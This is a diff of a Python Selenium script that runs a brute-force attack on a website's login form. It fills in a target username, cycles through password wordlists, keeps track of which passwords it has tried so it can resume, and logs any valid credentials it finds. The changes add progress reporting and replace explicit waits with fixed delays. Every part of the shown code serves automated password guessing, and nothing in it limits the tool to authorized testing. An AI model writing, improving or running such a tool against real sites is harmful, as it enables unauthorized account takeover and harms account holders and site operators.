@@ -6,9 +6,7 @@ from selenium import webdriver
 from selenium.webdriver.chrome.service import Service
 from selenium.webdriver.chrome.options import Options
 from selenium.webdriver.common.by import By
-from selenium.webdriver.support.ui import WebDriverWait
-from selenium.webdriver.support import expected_conditions as EC
-from selenium.common.exceptions import NoSuchElementException, InvalidSelectorException, WebDriverException, TimeoutException
+from selenium.common.exceptions import NoSuchElementException, InvalidSelectorException, WebDriverException
 from optparse import OptionParser
 
 # Setup logging
@@ -93,16 +91,6 @@ def read_tried_passwords(file_path='tried_passwords.txt'):
             tried_passwords = {line.strip() for line in f}
     return tried_passwords
 
-def read_passwords(file_path):
-    """Yield passwords from a file line by line in a memory-efficient manner."""
-    try:
-        with open(file_path, 'r') as f:
-            for line in f:
-                yield line.strip()
-    except FileNotFoundError:
-        logging.error(f"Password list {os.path.basename(file_path)} not found in 'pw' directory.")
-        return
-
 def brutes(username, username_selector, password_selector, login_btn_selector, password_lists, website, current_positions):
     """Perform a brute-force attack with the given password lists."""
     options = Options()
@@ -112,26 +100,34 @@ def brutes(username, username_selector, password_selector, login_btn_selector, p
     service = Service(CHROME_DVR_DIR)
     browser = webdriver.Chrome(service=service, options=options)
 
+    # Retrieve passwords that have already been tried
     tried_passwords = read_tried_passwords()
 
     for idx, pass_path in enumerate(password_lists):
+        # Retrieve current position from web_info.txt
         if pass_path not in current_positions:
             current_positions[pass_path] = 0
 
-        for i, password in enumerate(read_passwords(pass_path)):
-            if i < current_positions[pass_path]:
-                continue
+        try:
+            with open(pass_path, 'r') as f:
+                passwords = f.readlines()
 
+        except FileNotFoundError:
+            logging.error(f"Password list {os.path.basename(pass_path)} not found in 'pw' directory.")
+            continue
+
+        total_passwords = len(passwords)
+
+        for i in range(current_positions[pass_path], total_passwords):
+            password = passwords[i].strip()
+
+            # Skip passwords that have already been tried
             if password in tried_passwords:
                 continue
 
             try:
                 browser.get(website)
-
-                # Wait for the page and required elements to load
-                WebDriverWait(browser, 10).until(
-                    EC.presence_of_element_located((By.CSS_SELECTOR, username_selector))
-                )
+                t.sleep(2)
 
                 Sel_user = browser.find_element(By.CSS_SELECTOR, username_selector)
                 Sel_pas = browser.find_element(By.CSS_SELECTOR, password_selector)
@@ -141,22 +137,28 @@ def brutes(username, username_selector, password_selector, login_btn_selector, p
                 Sel_pas.send_keys(password)
 
                 enter.click()
-
                 t.sleep(5)
 
+                # Update the position marker in web_info.txt
                 current_positions[pass_path] = i + 1
                 update_web_info(updates={f"{os.path.basename(pass_path)}_position": current_positions[pass_path]})
 
+                # Log the tried password
                 with open('tried_passwords.txt', 'a') as log_file:
                     log_file.write(f"{password}\n")
 
+                # Check login success and log valid credentials
                 if browser.current_url != website:
                     logging.info(f"Valid credentials found: {username} / {password}")
                     log_valid_credential(username, password)
                     exit()
 
-                logging.info(f"Tried password: {password} for user: {username}")
+                # Calculate progress percentage
+                remaining_passwords = total_passwords - current_positions[pass_path]
+                progress_percentage = 100 * (i + 1) / total_passwords
 
+                logging.info(f"Tried password: {password} for user: {username}")
+                logging.info(f"Progress: {progress_percentage:.2f}% ({remaining_passwords} passwords left)")
             except NoSuchElementException:
                 logging.error("An element is missing, which could indicate either the password was found or you are locked out.")
                 exit()
@@ -165,10 +167,6 @@ def brutes(username, username_selector, password_selector, login_btn_selector, p
                 exit()
             except WebDriverException:
                 logging.error("An error occurred with WebDriver.")
-                browser.quit()
-                exit()
-            except TimeoutException:
-                logging.error("Timeout occurred while waiting for an element.")
                 browser.quit()
                 exit()
             except KeyboardInterrupt:
@@ -190,6 +188,7 @@ def wizard():
     target_username = web_info.get('target_username', '')
     password_lists = get_password_lists()
 
+    # Retrieve starting positions from web_info.txt
     current_positions = {
         path: int(web_info.get(f"{os.path.basename(path)}_position", 0))
         for path in password_lists
@@ -218,6 +217,7 @@ else:
     web_info = read_web_info()
     password_lists = get_password_lists() if not options.passlists else options.passlists.split(',')
 
+    # Retrieve starting positions from web_info.txt
     current_positions = {
         path: int(web_info.get(f"{os.path.basename(path)}_position", 0))
         for path in password_lists
